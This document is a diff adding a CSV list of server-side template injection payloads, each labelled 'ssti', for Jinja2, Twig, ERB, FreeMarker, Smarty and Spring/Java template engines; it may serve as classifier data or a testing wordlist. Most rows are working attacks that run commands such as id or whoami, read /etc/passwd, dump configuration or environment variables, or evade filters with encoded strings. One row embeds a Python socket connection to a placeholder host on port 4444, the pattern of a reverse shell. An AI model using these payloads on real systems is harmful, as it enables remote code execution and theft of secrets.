@@ -1,0 +1,51 @@
+Payloads,Types
+{{2*2}}[[3*3]],ssti
+{{3*3}},ssti
+{{3*'3'}},ssti
+<%= 3 * 3 %>,ssti
+${6*6},ssti
+${{3*3}},ssti
+@(6+5),ssti
+#{3*3},ssti
+#{ 3 * 3 },ssti
+{{dump(app)}},ssti
+"{{app.request.server.all|join(',')}}",ssti
+{{config.items()}},ssti
+{{ [].class.base.subclasses() }},ssti
+{{''.class.mro()[1].subclasses()}},ssti
+{{ ''.__class__.__mro__[2].__subclasses__() }},ssti
+"{{''.__class__.__base__.__subclasses__()}} # Search for Popen process, use payload below change 227 to index of Popen",ssti
+"{{''.__class__.__base__.__subclasses__()[227]('cat /etc/passwd', shell=True, stdout=-1).communicate()}}",ssti
+"{% for key, value in config.iteritems() %}<dt>{{ key|e }}</dt><dd>{{ value|e }}</dd>{% endfor %}",ssti
+{{'a'.toUpperCase()}},ssti
+{{ request }},ssti
+{{self}},ssti
+<%= File.open('/etc/passwd').read %>,ssti
+"<#assign ex = ""freemarker.template.utility.Execute""?new()>${ ex(""id"")}",ssti
+[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')},ssti
+"${""freemarker.template.utility.Execute""?new()(""id"")}",ssti
+"{{app.request.query.filter(0,0,1024,{'options':'system'})}}",ssti
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }},ssti
+"{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40](""/etc/passwd"").read() }}",ssti
+"{{''.__class__.mro()[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0].strip()}}",ssti
+{{config.__class__.__init__.__globals__['os'].popen('ls').read()}},ssti
+"{% for x in ().__class__.__base__.__subclasses__() %}{% if ""warning"" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}",ssti
+{$smarty.version},ssti
+{php}echo `id`;{/php},ssti
+{{['id']|filter('system')}},ssti
+{{['cat\x20/etc/passwd']|filter('system')}},ssti
+{{['cat$IFS/etc/passwd']|filter('system')}},ssti
+"{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}",ssti
+"{{request|attr([""_""*2,""class"",""_""*2]|join)}}",ssti
+"{{request|attr([""__"",""class"",""__""]|join)}}",ssti
+"{{request|attr(""__class__"")}}",ssti
+{{request.__class__}},ssti
+{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}},ssti
+"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""new java.lang.String('xxx')\"")}}",ssti
+"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var x=new java.lang.ProcessBuilder; x.command(\\\""whoami\\\""); x.start()\"")}}",ssti
+"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var x=new java.lang.ProcessBuilder; x.command(\\\""netstat\\\""); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\"")}}",ssti
+"{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var x=new java.lang.ProcessBuilder; x.command(\\\""uname\\\"",\\\""-a\\\""); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\"")}}",ssti
+"{% for x in ().__class__.__base__.__subclasses__() %}{% if ""warning"" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""ip\"",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\""/bin/cat\"", \""/etc/passwd\""]);'"").read().zfill(417)}}{%endif%}{% endfor %}",ssti
+${T(java.lang.System).getenv()},ssti
+${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')},ssti
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())},ssti
